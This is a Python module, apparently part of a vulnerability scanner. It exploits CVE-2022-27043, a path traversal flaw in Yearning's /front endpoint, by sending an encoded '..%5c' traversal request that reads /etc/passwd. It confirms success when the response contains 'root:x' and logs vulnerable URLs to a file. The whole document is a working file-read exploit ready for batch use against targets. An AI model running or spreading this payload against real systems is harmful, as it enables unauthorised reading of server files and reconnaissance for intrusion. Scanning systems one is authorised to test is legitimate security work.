#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests,urllib3
urllib3.disable_warnings()

class Cve_2022_27043:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd'
        try:
            req = requests.get(url2, verify=self.verify,proxies=self.proxy,headers=self.header)
            if "root:x" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("Yearning", f"存在Yearning front接口任意文件读取漏洞")
                    OutPrintInfo("Yearning", url2)
                    OutPrintInfo("Yearning", f"Response:\n{req.text.strip()}")
                else:
                    OutPrintInfoSuc("Yearning", f"存在任意文件读取漏洞 {url2}")
                    with open("./result/yearning_2022_27043.txt","a") as w:
                        w.write(f"{url2}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Yearning", f"不存在Yearning front接口任意文件读取漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("Yearning", "目标请求出错")
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Yearning", "开始检测Yearning front接口任意文件读取漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("Yearning", "Yearning front接口任意文件读取漏洞检测结束")
